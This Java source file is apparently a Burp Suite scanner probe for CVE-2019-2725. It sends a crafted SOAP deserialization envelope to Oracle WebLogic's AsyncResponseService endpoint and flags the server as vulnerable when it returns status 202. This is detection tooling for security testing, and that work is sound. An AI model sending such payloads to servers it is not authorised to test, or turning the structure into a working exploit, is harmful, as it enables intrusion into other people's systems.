package probes;

import burp.*;

import java.util.HashMap;

public class CVE_2019_2725 extends Probe {
    private static final String NAME = "CVE-2019-2725";
    private static final String SEVERITY = "High";
    private static final String DESC = "Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: Web Services). Supported versions that are affected are 10.3.6.0.0 and 12.1.3.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts).";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        String path = "/_async/AsyncResponseService";
        // 无回显payload
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
                         "  <soapenv:Header>\n" +
                         "    <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
                         "      <void class=\"POC\">\n" +
                         "        <array class=\"xx\" length=\"0\">\n" +
                         "        </array>\n" +
                         "      <void method=\"start\"/>\n" +
                         "      </void>\n" +
                         "    </work:WorkContext>\n" +
                         "  </soapenv:Header>\n" +
                         "  <soapenv:Body>\n" +
                         "    <asy:onAsyncDelivery/>\n" +
                         "  </soapenv:Body>\n" +
                         "</soapenv:Envelope>";

        IHttpRequestResponse checkReqResp = postReq(
                requestResponse.getHttpService(),
                path,
                new HashMap<>() {
                    { put("Content-Type", "text/xml"); }
                },
                payload
        );

        if (Utilities.getStatus(checkReqResp) == 202) {
            return new WebLogicIssue(checkReqResp, NAME, DESC, SEVERITY);
        } else return null;
    }
}
